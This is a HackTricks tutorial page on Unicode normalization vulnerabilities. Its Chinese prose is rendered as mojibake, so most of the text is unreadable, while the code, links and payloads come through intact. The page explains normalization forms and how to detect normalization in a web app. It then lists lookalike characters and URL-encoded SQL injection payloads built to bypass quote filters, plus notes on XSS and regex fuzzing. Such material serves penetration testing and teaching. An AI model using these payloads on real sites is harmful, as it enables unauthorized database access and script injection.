# Unicode Normalization

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

**è¿™æ˜¯å¯¹ä»¥ä¸‹å†…å®¹çš„æ€»ç»“:** [**https://appcheck-ng.com/unicode-normalization-vulnerabilities-the-special-k-polyglot/**](https://appcheck-ng.com/unicode-normalization-vulnerabilities-the-special-k-polyglot/)ã€‚è¯·æŸ¥çœ‹ä»¥è·å–æ›´å¤šè¯¦ç»†ä¿¡æ¯ï¼ˆå›¾ç‰‡æ¥è‡ªé‚£é‡Œï¼‰ã€‚

## ç†è§£ Unicode å’Œè§„èŒƒåŒ–

Unicode è§„èŒƒåŒ–æ˜¯ä¸€ä¸ªç¡®ä¿å­—ç¬¦çš„ä¸åŒäºŒè¿›åˆ¶è¡¨ç¤ºæ ‡å‡†åŒ–ä¸ºç›¸åŒäºŒè¿›åˆ¶å€¼çš„è¿‡ç¨‹ã€‚è¿™ä¸ªè¿‡ç¨‹åœ¨ç¼–ç¨‹å’Œæ•°æ®å¤„ç†ä¸­çš„å­—ç¬¦ä¸²å¤„ç†è‡³å…³é‡è¦ã€‚Unicode æ ‡å‡†å®šä¹‰äº†ä¸¤ç§å­—ç¬¦ç­‰ä»·æ€§ï¼š

1. **è§„èŒƒç­‰ä»·æ€§**ï¼šå¦‚æœå­—ç¬¦åœ¨æ‰“å°æˆ–æ˜¾ç¤ºæ—¶å…·æœ‰ç›¸åŒçš„å¤–è§‚å’Œå«ä¹‰ï¼Œåˆ™è®¤ä¸ºå®ƒä»¬æ˜¯è§„èŒƒç­‰ä»·çš„ã€‚
2. **å…¼å®¹ç­‰ä»·æ€§**ï¼šä¸€ç§è¾ƒå¼±çš„ç­‰ä»·å½¢å¼ï¼Œå…¶ä¸­å­—ç¬¦å¯èƒ½è¡¨ç¤ºç›¸åŒçš„æŠ½è±¡å­—ç¬¦ï¼Œä½†å¯ä»¥ä»¥ä¸åŒçš„æ–¹å¼æ˜¾ç¤ºã€‚

æœ‰ **å››ç§ Unicode è§„èŒƒåŒ–ç®—æ³•**ï¼šNFCã€NFDã€NFKC å’Œ NFKDã€‚æ¯ç§ç®—æ³•ä»¥ä¸åŒçš„æ–¹å¼é‡‡ç”¨è§„èŒƒå’Œå…¼å®¹æ€§è§„èŒƒåŒ–æŠ€æœ¯ã€‚è¦æ·±å…¥äº†è§£ï¼Œå¯ä»¥åœ¨ [Unicode.org](https://unicode.org/) ä¸Šæ¢ç´¢è¿™äº›æŠ€æœ¯ã€‚

### å…³äº Unicode ç¼–ç çš„å…³é”®ç‚¹

ç†è§£ Unicode ç¼–ç è‡³å…³é‡è¦ï¼Œç‰¹åˆ«æ˜¯åœ¨å¤„ç†ä¸åŒç³»ç»Ÿæˆ–è¯­è¨€ä¹‹é—´çš„äº’æ“ä½œæ€§é—®é¢˜æ—¶ã€‚ä»¥ä¸‹æ˜¯ä¸»è¦è¦ç‚¹ï¼š

* **ä»£ç ç‚¹å’Œå­—ç¬¦**ï¼šåœ¨ Unicode ä¸­ï¼Œæ¯ä¸ªå­—ç¬¦æˆ–ç¬¦å·éƒ½åˆ†é…ä¸€ä¸ªç§°ä¸ºâ€œä»£ç ç‚¹â€çš„æ•°å€¼ã€‚
* **å­—èŠ‚è¡¨ç¤º**ï¼šä»£ç ç‚¹ï¼ˆæˆ–å­—ç¬¦ï¼‰åœ¨å†…å­˜ä¸­ç”±ä¸€ä¸ªæˆ–å¤šä¸ªå­—èŠ‚è¡¨ç¤ºã€‚ä¾‹å¦‚ï¼ŒLATIN-1 å­—ç¬¦ï¼ˆåœ¨è‹±è¯­å›½å®¶å¸¸è§ï¼‰ä½¿ç”¨ä¸€ä¸ªå­—èŠ‚è¡¨ç¤ºã€‚ç„¶è€Œï¼Œå­—ç¬¦é›†è¾ƒå¤§çš„è¯­è¨€éœ€è¦æ›´å¤šå­—èŠ‚è¿›è¡Œè¡¨ç¤ºã€‚
* **ç¼–ç **ï¼šè¿™ä¸ªæœ¯è¯­æŒ‡çš„æ˜¯å­—ç¬¦å¦‚ä½•è½¬æ¢ä¸ºä¸€ç³»åˆ—å­—èŠ‚ã€‚UTF-8 æ˜¯ä¸€ç§æµè¡Œçš„ç¼–ç æ ‡å‡†ï¼Œå…¶ä¸­ ASCII å­—ç¬¦ä½¿ç”¨ä¸€ä¸ªå­—èŠ‚è¡¨ç¤ºï¼Œå…¶ä»–å­—ç¬¦æœ€å¤šä½¿ç”¨å››ä¸ªå­—èŠ‚ã€‚
* **å¤„ç†æ•°æ®**ï¼šå¤„ç†æ•°æ®çš„ç³»ç»Ÿå¿…é¡»äº†è§£æ‰€ä½¿ç”¨çš„ç¼–ç ï¼Œä»¥æ­£ç¡®åœ°å°†å­—èŠ‚æµè½¬æ¢ä¸ºå­—ç¬¦ã€‚
* **UTF çš„å˜ä½“**ï¼šé™¤äº† UTF-8ï¼Œè¿˜æœ‰å…¶ä»–ç¼–ç æ ‡å‡†ï¼Œå¦‚ UTF-16ï¼ˆä½¿ç”¨æœ€å°‘ 2 ä¸ªå­—èŠ‚ï¼Œæœ€å¤š 4 ä¸ªï¼‰å’Œ UTF-32ï¼ˆå¯¹æ‰€æœ‰å­—ç¬¦ä½¿ç”¨ 4 ä¸ªå­—èŠ‚ï¼‰ã€‚

ç†è§£è¿™äº›æ¦‚å¿µå¯¹äºæœ‰æ•ˆå¤„ç†å’Œå‡è½»å›  Unicode çš„å¤æ‚æ€§åŠå…¶å„ç§ç¼–ç æ–¹æ³•è€Œäº§ç”Ÿçš„æ½œåœ¨é—®é¢˜è‡³å…³é‡è¦ã€‚

Unicode å¦‚ä½•è§„èŒƒåŒ–ä¸¤ä¸ªè¡¨ç¤ºç›¸åŒå­—ç¬¦çš„ä¸åŒå­—èŠ‚çš„ç¤ºä¾‹ï¼š
```python
unicodedata.normalize("NFKD","chloe\u0301") == unicodedata.normalize("NFKD", "chlo\u00e9")
```
**Unicode ç­‰æ•ˆå­—ç¬¦åˆ—è¡¨å¯ä»¥åœ¨è¿™é‡Œæ‰¾åˆ°ï¼š** [https://appcheck-ng.com/wp-content/uploads/unicode\_normalization.html](https://appcheck-ng.com/wp-content/uploads/unicode\_normalization.html) å’Œ [https://0xacb.com/normalization\_table](https://0xacb.com/normalization\_table)

### å‘ç°

å¦‚æœä½ èƒ½åœ¨ä¸€ä¸ª webapp ä¸­æ‰¾åˆ°ä¸€ä¸ªè¢«å›æ˜¾çš„å€¼ï¼Œä½ å¯ä»¥å°è¯•å‘é€ **â€˜KELVIN SIGNâ€™ (U+0212A)**ï¼Œå®ƒ **è§„èŒƒåŒ–ä¸º "K"**ï¼ˆä½ å¯ä»¥å°†å…¶å‘é€ä¸º `%e2%84%aa`ï¼‰ã€‚**å¦‚æœå›æ˜¾äº† "K"**ï¼Œé‚£ä¹ˆæŸç§ **Unicode è§„èŒƒåŒ–** æ­£åœ¨è¿›è¡Œã€‚

å¦ä¸€ä¸ª **ä¾‹å­**ï¼š`%F0%9D%95%83%E2%85%87%F0%9D%99%A4%F0%9D%93%83%E2%85%88%F0%9D%94%B0%F0%9D%94%A5%F0%9D%99%96%F0%9D%93%83` åœ¨ **unicode** ä¹‹åæ˜¯ `Leonishan`ã€‚

## **æ˜“å—æ”»å‡»çš„ç¤ºä¾‹**

### **SQL æ³¨å…¥è¿‡æ»¤å™¨ç»•è¿‡**

æƒ³è±¡ä¸€ä¸ªç½‘é¡µï¼Œå®ƒä½¿ç”¨å­—ç¬¦ `'` æ¥åˆ›å»ºåŒ…å«ç”¨æˆ·è¾“å…¥çš„ SQL æŸ¥è¯¢ã€‚è¿™ä¸ªç½‘é¡µä½œä¸ºå®‰å…¨æªæ–½ï¼Œ**åˆ é™¤** ç”¨æˆ·è¾“å…¥ä¸­æ‰€æœ‰å‡ºç°çš„å­—ç¬¦ **`'`**ï¼Œä½† **åœ¨åˆ é™¤ä¹‹å** å’Œ **åˆ›å»ºæŸ¥è¯¢ä¹‹å‰**ï¼Œå®ƒä¼šä½¿ç”¨ **Unicode** å¯¹ç”¨æˆ·è¾“å…¥è¿›è¡Œ **è§„èŒƒåŒ–**ã€‚

ç„¶åï¼Œæ¶æ„ç”¨æˆ·å¯ä»¥æ’å…¥ä¸€ä¸ªä¸åŒçš„ Unicode å­—ç¬¦ï¼Œç­‰åŒäº `' (0x27)`ï¼Œå¦‚ `%ef%bc%87`ï¼Œå½“è¾“å…¥è¢«è§„èŒƒåŒ–æ—¶ï¼Œä¼šåˆ›å»ºä¸€ä¸ªå•å¼•å·ï¼Œä»è€Œå‡ºç° **SQL æ³¨å…¥æ¼æ´**ï¼š

![https://appcheck-ng.com/unicode-normalization-vulnerabilities-the-special-k-polyglot/](<../../.gitbook/assets/image (702).png>)

**ä¸€äº›æœ‰è¶£çš„ Unicode å­—ç¬¦**

* `o` -- %e1%b4%bc
* `r` -- %e1%b4%bf
* `1` -- %c2%b9
* `=` -- %e2%81%bc
* `/` -- %ef%bc%8f
* `-`-- %ef%b9%a3
* `#`-- %ef%b9%9f
* `*`-- %ef%b9%a1
* `'` -- %ef%bc%87
* `"` -- %ef%bc%82
* `|` -- %ef%bd%9c
```
' or 1=1-- -
%ef%bc%87+%e1%b4%bc%e1%b4%bf+%c2%b9%e2%81%bc%c2%b9%ef%b9%a3%ef%b9%a3+%ef%b9%a3

" or 1=1-- -
%ef%bc%82+%e1%b4%bc%e1%b4%bf+%c2%b9%e2%81%bc%c2%b9%ef%b9%a3%ef%b9%a3+%ef%b9%a3

' || 1==1//
%ef%bc%87+%ef%bd%9c%ef%bd%9c+%c2%b9%e2%81%bc%e2%81%bc%c2%b9%ef%bc%8f%ef%bc%8f

" || 1==1//
%ef%bc%82+%ef%bd%9c%ef%bd%9c+%c2%b9%e2%81%bc%e2%81%bc%c2%b9%ef%bc%8f%ef%bc%8f
```
#### sqlmap æ¨¡æ¿

{% embed url="https://github.com/carlospolop/sqlmap_to_unicode_template" %}

### XSSï¼ˆè·¨ç«™è„šæœ¬æ”»å‡»ï¼‰

æ‚¨å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å­—ç¬¦ä¹‹ä¸€æ¥æ¬ºéª— webapp å¹¶åˆ©ç”¨ XSSï¼š

![https://appcheck-ng.com/unicode-normalization-vulnerabilities-the-special-k-polyglot/](<../../.gitbook/assets/image (312) (2).png>)

è¯·æ³¨æ„ï¼Œä¾‹å¦‚ï¼Œç¬¬ä¸€ä¸ªå»ºè®®çš„ Unicode å­—ç¬¦å¯ä»¥å‘é€ä¸ºï¼š`%e2%89%ae` æˆ– `%u226e`

![https://appcheck-ng.com/unicode-normalization-vulnerabilities-the-special-k-polyglot/](<../../.gitbook/assets/image (215) (1) (1).png>)

### æ¨¡ç³Šæµ‹è¯•æ­£åˆ™è¡¨è¾¾å¼

å½“åç«¯ **æ£€æŸ¥ç”¨æˆ·è¾“å…¥çš„æ­£åˆ™è¡¨è¾¾å¼** æ—¶ï¼Œ**è¾“å…¥** å¯èƒ½ä¼šä¸º **æ­£åˆ™è¡¨è¾¾å¼** è¿›è¡Œ **è§„èŒƒåŒ–**ï¼Œä½† **ä¸** ä¼šä¸ºå…¶ **ä½¿ç”¨** çš„åœ°æ–¹è¿›è¡Œ **è§„èŒƒåŒ–**ã€‚ä¾‹å¦‚ï¼Œåœ¨å¼€æ”¾é‡å®šå‘æˆ– SSRF ä¸­ï¼Œæ­£åˆ™è¡¨è¾¾å¼å¯èƒ½ä¼š **è§„èŒƒåŒ–å‘é€çš„ URL**ï¼Œä½†éšå **æŒ‰åŸæ ·è®¿é—®**ã€‚

å·¥å…· [**recollapse**](https://github.com/0xacb/recollapse) \*\*\*\* å…è®¸ **ç”Ÿæˆè¾“å…¥çš„å˜ä½“** ä»¥æ¨¡ç³Šæµ‹è¯•åç«¯ã€‚æœ‰å…³æ›´å¤šä¿¡æ¯ï¼Œè¯·æŸ¥çœ‹ **github** å’Œè¿™ç¯‡ [**æ–‡ç« **](https://0xacb.com/2022/11/21/recollapse/)ã€‚

## å‚è€ƒæ–‡çŒ®

* [**https://labs.spotify.com/2013/06/18/creative-usernames/**](https://labs.spotify.com/2013/06/18/creative-usernames/)
* [**https://security.stackexchange.com/questions/48879/why-does-directory-traversal-attack-c0af-work**](https://security.stackexchange.com/questions/48879/why-does-directory-traversal-attack-c0af-work)
* [**https://jlajara.gitlab.io/posts/2020/02/19/Bypass\_WAF\_Unicode.html**](https://jlajara.gitlab.io/posts/2020/02/19/Bypass\_WAF\_Unicode.html)

{% hint style="success" %}
å­¦ä¹ å’Œå®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ å’Œå®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass) æˆ– **åœ¨ Twitter ä¸Šå…³æ³¨** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}
